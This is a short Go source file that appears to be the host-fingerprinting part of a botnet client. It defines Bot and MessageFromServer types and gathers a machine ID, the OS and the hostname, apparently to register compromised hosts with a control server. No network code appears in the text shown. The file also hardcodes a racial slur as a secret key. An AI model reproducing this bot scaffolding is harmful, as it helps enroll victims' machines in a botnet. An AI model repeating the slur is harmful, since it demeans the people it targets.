package main

import (
	"os"
	"runtime"

	"github.com/denisbrodbeck/machineid"
)

type Bot struct {
	ID       string `json:"id"`
	OS       string `json:"os"`
	HostName string `json:"hostname"`
}

type MessageFromServer struct {
	Type    string `json:"type"`
	Message string `json:"message"`
}

type Error struct {
	BOTID string
	ERR   error
}

func getMachineID() string {
	secretkey := "niggastfu"
	id, err := machineid.ProtectedID(secretkey)
	if err != nil {

		return ""
	}

	return id

}

func getSysInfo() *Bot {
	hostname, err := os.Hostname()
	if err != nil {
		// log.Println("Cannot get hostname: ", err)
	}
	return &Bot{
		ID:       getMachineID(),
		OS:       runtime.GOOS,
		HostName: hostname,
	}
}
